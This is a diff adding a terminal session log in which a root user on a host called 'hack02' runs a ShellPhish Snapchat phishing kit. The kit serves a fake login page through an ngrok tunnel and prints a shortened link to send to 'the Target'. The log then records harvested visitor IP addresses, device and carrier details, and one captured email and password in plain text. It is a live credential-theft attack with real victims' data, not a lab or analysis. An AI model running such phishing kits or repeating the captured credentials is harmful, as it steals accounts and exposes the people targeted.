@@ -1,0 +1,61 @@
+Script started on 2020-08-27 13:42:16-11:00 [TERM="screen" TTY="/dev/pts/10" COLUMNS="80" LINES="24"]
+Hello...
+cd /root/bot/hacks/shellphish/; ./Snapchat1.sh; pkill -f -2 ngrok > /dev/null 2>&1; killall -2 ngrok > /dev/null 2>&1
+root@hack02:~/bot# cd /root/bot/hacks/shellphish/; ./Snapchat1.sh; pkill -f -2 ngrok > /dev/null 2>&1; killall -2 ngrok > /dev/null 2>&1
+
+[*] Starting php server...
+[*] Starting ngrok server...
+
+[*] Send this link to the Target: https://0ba262007347.ngrok.io
+
+[*] Or using tinyurl: http://tinyurl.com/yxnbts5g
+
+
+[*] Waiting IPs and Credentials, Press Ctrl + C to exit...
+
+
+[*] IP Found!
+[*] Target IP: 52.224.22.238
+[*] Target IP: User-Agent:
+[*] User-Agent:	 User-Agent: python-requests/2.23.0IP: 35.196.132.85
+[*] User-Agent:	 User-Agent: Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)
+[*] Saved: snapchat/saved.ip.txt
+
+
+[*] Waiting Credentials and Next IP.
+
+[*] IP Found!
+[*] Target IP: 2607:fb90:b94a:f6c7:4dad:fd80:f2cd:8923
+[*] User-Agent:	 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1
+[*] Saved: snapchat/saved.ip.txt
+
+[*] Hostname: 2607:fb90:b94a:f6c7:4dad:fd80:f2cd:8923
+[*] IP Continent: North America (NA)
+[*] IP Country:	 United States
+[*] AS Number: AS21928 T-Mobile USA, Inc.
+[*] IP Address Speed: Unknown Internet Speed
+[*] IP Currency: United States dollar($) (USD)
+
+[*] Waiting Credentials and Next IP.
+
+[*] Credentials Found!
+[*] Account: suckmyballs@yahoo.com
+[*] Password:  Bighairyballs
+[*] Saved: sites/snapchat/saved.usernames.txt
+
+[*] Waiting Next IP and Next Credentials, Press Ctrl + C to exit...
+
+[*] IP Found!
+[*] Target IP: 2607:fb90:b94a:f6c7:4dad:fd80:f2cd:8923
+[*] User-Agent:	 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1
+[*] Saved: snapchat/saved.ip.txt
+
+[*] Hostname: 2607:fb90:b94a:f6c7:4dad:fd80:f2cd:8923
+[*] IP Continent: North America (NA)
+[*] IP Country:	 United States
+[*] AS Number: AS21928 T-Mobile USA, Inc.
+[*] IP Address Speed: Unknown Internet Speed
+[*] IP Currency: United States dollar($) (USD)
+
+[*] Waiting Credentials and Next IP.
+
